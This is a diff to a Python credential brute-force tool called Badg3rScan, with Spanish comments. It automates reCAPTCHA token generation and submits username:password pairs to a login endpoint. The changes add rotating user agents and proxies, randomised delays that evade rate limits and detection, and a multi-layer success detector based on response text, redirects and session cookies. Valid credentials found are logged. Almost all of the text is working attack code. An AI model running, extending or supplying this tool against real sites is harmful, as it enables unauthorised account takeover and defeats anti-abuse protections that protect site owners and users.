@@ -91,7 +91,9 @@ def signal_handler(signum, frame):
 
 def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="firefox", verbose=False):
     if verbose:
-        print(f"[i] Inicializando WebDriver: {webdriver_type}")
+        with print_lock:
+            print(f"\r{' ' * 80}\r", end='')
+            print(f"[i] Inicializando WebDriver: {webdriver_type}")
 
     driver = None
     try:
@@ -178,7 +180,9 @@ def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="
             )
         except:
             if verbose:
-                print("[!] Timeout esperando captcha")
+                with print_lock:
+                    print(f"\r{' ' * 80}\r", end='')
+                    print("[!] Timeout esperando captcha")
             pass
 
         token = driver.execute_script(f"""
@@ -206,6 +210,64 @@ def cargar_diccionario(filepath):
     with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
         return [line.strip() for line in f if line.strip()]
 
+def cargar_user_agents(filepath):
+    if not filepath or not os.path.exists(filepath):
+        # User agents por defecto
+        return [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+        ]
+    
+    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+        return [line.strip() for line in f if line.strip()]
+
+def cargar_proxies(proxy_file=None, single_proxy=None):
+    """Carga proxies desde archivo o proxy único"""
+    proxies = []
+    
+    if single_proxy:
+        proxies.append(single_proxy.strip())
+    
+    if proxy_file and os.path.exists(proxy_file):
+        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):  # Ignorar comentarios
+                    proxies.append(line)
+    
+    # Validar formato básico de proxies
+    valid_proxies = []
+    for proxy in proxies:
+        if '://' in proxy:  # Formato básico http://... o socks://...
+            valid_proxies.append(proxy)
+        else:
+            with print_lock:
+                print(f"{YELLOW}[!] Proxy con formato inválido ignorado: {proxy}{RESET}")
+    
+    return valid_proxies
+
+def get_combined_patterns(custom_patterns, pattern_type="success"):
+    """Combina patrones base con patrones personalizados"""
+    
+    base_success_patterns = [
+        "true", "success", "bienvenido", "dashboard", "welcome", "loggedin",
+        "successful", "correcto", "válido", "exitoso", "login successful"
+    ]
+    
+    base_fail_patterns = [
+        "false", "error", "failed", "usuario", "contraseña", "erroneos", "erróneos", 
+        "incorrecto", "inválido", "Usuario o contraseña erróneos",
+        "Acceso denegado por captcha", "credenciales incorrectas", 
+        "datos incorrectos", "login failed", "authentication failed"
+    ]
+    
+    if pattern_type == "success":
+        return base_success_patterns + (custom_patterns if custom_patterns else [])
+    else:
+        return base_fail_patterns + (custom_patterns if custom_patterns else [])
+
 def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
     chars = ''
     if tipo == "digits":
@@ -227,27 +289,83 @@ def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
         fuzz.add(''.join(random.choices(chars, k=length)))
     return list(fuzz)
 
-def check_success(response, error_indicators):
+def check_success(response, success_indicators, fail_indicators, success_codes, check_cookies=True, verbose=False):
+    """
+    Análisis inteligente multi-capa para detectar login exitoso
+    Prioriza análisis de contenido sobre códigos HTTP
+    """
+    response_text = response.text.lower()
+    
+    # Capa 1: Análisis de contenido - Patrones de FALLO (alta prioridad)
+    for fail_pattern in fail_indicators:
+        if fail_pattern.lower() in response_text:
+            if verbose:
+                with print_lock:
+                    print(f"[DEBUG] Fail pattern found: {fail_pattern}")
+            return False, f"Fail pattern detected: {fail_pattern}"
+    
+    # Capa 2: Análisis de contenido - Patrones de ÉXITO (alta prioridad)
+    for success_pattern in success_indicators:
+        if success_pattern.lower() in response_text:
+            if verbose:
+                with print_lock:
+                    print(f"[DEBUG] Success pattern found: {success_pattern}")
+            return True, f"Success pattern detected: {success_pattern}"
+    
+    # Capa 3: Verificar redirecciones exitosas
+    if hasattr(response, 'history') and response.history:
+        redirect_url = response.url.lower()
+        success_redirect_patterns = ["dashboard", "home", "panel", "admin", "profile", "welcome"]
+        
+        for pattern in success_redirect_patterns:
+            if pattern in redirect_url:
+                if verbose:
+                    with print_lock:
+                        print(f"[DEBUG] Success redirect detected: {redirect_url}")
+                return True, f"Success redirect to: {pattern}"
+    
+    # Capa 4: Verificar cookies de sesión
+    if check_cookies and response.cookies:
+        session_cookie_patterns = ["session", "auth", "login", "token", "jsessionid", "phpsessid"]
+        
+        for cookie_name in response.cookies.keys():
+            cookie_name_lower = cookie_name.lower()
+            for pattern in session_cookie_patterns:
+                if pattern in cookie_name_lower:
+                    if verbose:
+                        with print_lock:
+                            print(f"[DEBUG] Session cookie detected: {cookie_name}")
+                    return True, f"Session cookie set: {cookie_name}"
+    
+    # Capa 5: Análisis JSON (compatibilidad con código existente)
     try:
         data = response.json()
+        if not data.get("Result", True):
+            msg = data.get("Msg", "Unknown JSON error")
+            return False, f"JSON Result=False: {msg}"
+        elif data.get("Result", False):  # Explícitamente True
+            return True, "JSON Result=True"
     except ValueError:
-        # La respuesta no es JSON válido
-        return False, "Invalid JSON response"
+        # No es JSON, continuar
+        pass
+    
+    # Capa 6: Códigos HTTP como indicador COMPLEMENTARIO (baja prioridad)
+    if response.status_code in success_codes and response.status_code != 200:
+        if verbose:
+            with print_lock:
+                print(f"[DEBUG] Success HTTP code detected: {response.status_code}")
+        return True, f"Success HTTP code: {response.status_code}"
+    
+    # Si llegamos aquí, asumimos fallo por defecto
+    return False, f"No success indicators found (HTTP: {response.status_code})"
 
-    if not data.get("Result", True):
-        msg = data.get("Msg", "")
-        for err in error_indicators:
-            if err in msg:
-                return False, err
-        return False, "Unknown error"
-    return True, None
-
-def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, webdriver_type="firefox", verbose=False):
+def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, 
+                  webdriver_type="firefox", verbose=False, user_agent=None, proxy=None, proxy_timeout=10):    
     token, cookies = generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type, verbose)
     headers = {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Requested-With": "XMLHttpRequest",
-        "User-Agent": "Mozilla/5.0",
+        "User-Agent": user_agent if user_agent else "Mozilla/5.0",  # MODIFICAR esta línea        
         "Origin": origin_url if origin_url else login_url.split("/")[0],
         "Referer": login_url,
         "Accept": "*/*"
@@ -261,12 +379,31 @@ def login_attempt(username, password, site_key, captcha_action, login_url, post_
 
     with requests.Session() as s:
         s.cookies.update(cookies)
-        response = s.post(post_url, headers=headers, data=data)
+        
+        # Configurar proxy si se proporciona
+        if proxy:
+            proxies_dict = {
+                'http': proxy,
+                'https': proxy
+            }
+            s.proxies.update(proxies_dict)
+        
+        # Configurar timeout
+        response = s.post(post_url, headers=headers, data=data, timeout=proxy_timeout)
     return response
 
-def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, error_indicator, log_filename, webdriver_type, verbose):
+def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, log_filename, 
+          webdriver_type, verbose, success_indicators, fail_indicators, success_codes, check_cookies, 
+          delay, jitter, user_agents_file, proxies_list, proxy_timeout):    
     global attempts_done
     thread_id = threading.current_thread().ident
+    user_agents = cargar_user_agents(user_agents_file)
+    ua_index = 0
+    # Inicializar índices para rotación
+    proxy_index = 0
+    current_proxy = None
+    if proxies_list:
+        current_proxy = proxies_list[proxy_index % len(proxies_list)]
     
     while not success_flag.is_set() and not stop_event.is_set():
         try:
@@ -278,15 +415,27 @@ def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_su
                 break
             else:
                 continue
-        
+        # Seleccionar user agent rotativo
+        current_ua = user_agents[ua_index % len(user_agents)]
+        ua_index += 1
         # Verificar nuevamente si debemos parar antes de procesar
         if stop_event.is_set() or success_flag.is_set():
             combo_queue.task_done()
             break
             
         try:
-            response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url, webdriver_type, verbose)
-            
+            response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url, 
+                                     webdriver_type, verbose, current_ua, current_proxy, proxy_timeout)
+            # Rotar proxy si hay múltiples
+            if proxies_list and len(proxies_list) > 1:
+                proxy_index += 1
+                current_proxy = proxies_list[proxy_index % len(proxies_list)]
+            # Rate limiting
+            if delay > 0:
+                sleep_time = delay
+                if jitter > 0:
+                    sleep_time += random.uniform(0, jitter)
+                time.sleep(sleep_time) 
             with print_lock:
                 print(f"\r{' ' * 80}\r", end='')
                 if verbose:
@@ -295,7 +444,14 @@ def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_su
                 else:
                     print(f"[+] Attempt: {username}:{password}")
 
-                success, error_msg = check_success(response, error_indicator)
+                success, error_msg = check_success(
+                    response, 
+                    success_indicators, 
+                    fail_indicators,
+                    success_codes,
+                    check_cookies,
+                    verbose
+                )
                 if success:
                     print(f"{GREEN}[+] Valid Login Found! {username}:{password}{RESET}")
                     with open(log_filename, "a", encoding="utf-8") as f:
@@ -316,7 +472,10 @@ def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_su
         except Exception as e:
             if not stop_event.is_set():
                 with print_lock:
-                    print(f"{RED}[!] Error con {username}:{password}: {e}{RESET}")
+                    if "proxy" in str(e).lower():
+                        print(f"{RED}[!] Error de proxy con {username}:{password}: {e}{RESET}")
+                    else:
+                        print(f"{RED}[!] Error con {username}:{password}: {e}{RESET}")
         finally:
             # Actualizar contador y marcar tarea como completada
             with attempts_lock:
@@ -413,6 +572,13 @@ def main():
     signal.signal(signal.SIGTERM, signal_handler)
     
     parser = argparse.ArgumentParser(description="Badg3rScan - Fuzzer/fuerza bruta con recaptcha")
+    parser.add_argument("--success-indicators", nargs='+', default=[],help="Additional success patterns to look for in response (case insensitive)")
+    parser.add_argument("--fail-indicators", nargs='+', default=[], help="Additional failure patterns to look for in response (case insensitive)")
+    parser.add_argument("--success-codes", nargs='+', type=int, default=[302], help="HTTP codes that indicate success")
+    parser.add_argument("--delay", type=float, default=0, help="Base delay between requests in seconds")
+    parser.add_argument("--jitter", type=float, default=0, help="Random jitter 0-X seconds added to delay")
+    parser.add_argument("--user-agents-file", help="File with user agents list for rotation")
+    parser.add_argument("--check-cookies", action="store_true", default=True, help="Check for session cookies as success indicator")
     parser.add_argument("--site-key", required=True, help="Site key del reCaptcha")
     parser.add_argument("--captcha-action", required=True, help="Action del reCaptcha")
     parser.add_argument("--login-url", required=True, help="URL donde se carga el captcha (frontend)")
@@ -426,7 +592,9 @@ def main():
     parser.add_argument("--no-banner", action="store_true", help="Desactiva el banner genial de badg3rscan", default=False)
     parser.add_argument("--webdriver", choices=["chrome", "firefox"], default="firefox", help="Webdriver a usar: chrome o firefox (default firefox)")
     parser.add_argument("--verbose", action="store_true", help="Activa impresión detallada", default=False)
-
+    parser.add_argument("--proxy", help="Proxy único formato http://user:pass@host:port o http://host:port")
+    parser.add_argument("--proxy-file", help="Archivo con lista de proxies (uno por línea)")
+    parser.add_argument("--proxy-timeout", type=int, default=10, help="Timeout para conexiones proxy en segundos")
     args = parser.parse_args()
     if args.no_banner == False:
         print_banner()
@@ -441,24 +609,30 @@ def main():
     global total_attempts
     total_attempts = combo_queue.qsize()
 
-    error_indicator = {
-    "Usuario o contraseña erróneos.",
-    "Acceso denegado por captcha"
-    }
+    # Cargar proxies
+    proxies_list = cargar_proxies(args.proxy_file, args.proxy)
+    if proxies_list:
+        print(f"[>] {len(proxies_list)} proxies loaded")
+    else:
+        print("[>] No proxies setup - Direct connection")
 
     log_filename = f"fuzzlog-{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log"
 
     start_time = datetime.now()
     print(f"[>] Ready to fuzz and bruteforce your targets! 🦡💥")
     print(f"[>] Starting {args.threads} threads...")
+    time.sleep(1)  # pause for visual
+    print(f"[>] Fuzzing in progress...")
     threads = []
     
     # Lanzar hilo de barra de progreso
     barra_thread = threading.Thread(target=mostrar_barra_progreso, daemon=True)
     barra_thread.start()
-    
+    # Preparar patrones combinados
+    combined_success = get_combined_patterns(args.success_indicators, "success")
+    combined_fail = get_combined_patterns(args.fail_indicators, "fail")
     try:
-        # Crear y lanzar threads worker
+        # Crear threads worker (sin iniciar aún)
         for _ in range(args.threads):
             t = threading.Thread(target=worker, args=(
                 args.site_key,
@@ -467,14 +641,33 @@ def main():
                 args.post_url,
                 args.origin_url,
                 args.stop_on_success,
-                error_indicator,
                 log_filename,
                 args.webdriver,
-                args.verbose
+                args.verbose,
+                combined_success,
+                combined_fail,
+                args.success_codes,
+                args.check_cookies,
+                args.delay,
+                args.jitter,
+                args.user_agents_file,
+                proxies_list,
+                args.proxy_timeout
             ))
-            t.daemon = False  # No daemon para poder hacer join
-            t.start()
+            t.daemon = False
             threads.append(t)
+
+        # Pausa para inicialización limpia
+        time.sleep(0.5)
+
+        # Lanzar barra de progreso
+        barra_thread = threading.Thread(target=mostrar_barra_progreso, daemon=True)
+        barra_thread.start()
+
+        # Iniciar todos los threads worker
+        for t in threads:
+            t.start()
+            time.sleep(0.1)  # Pequeño delay entre inicios
 
         # Esperar a que terminen todos los trabajos o se detecte una interrupción
         while not stop_event.is_set() and not success_flag.is_set():
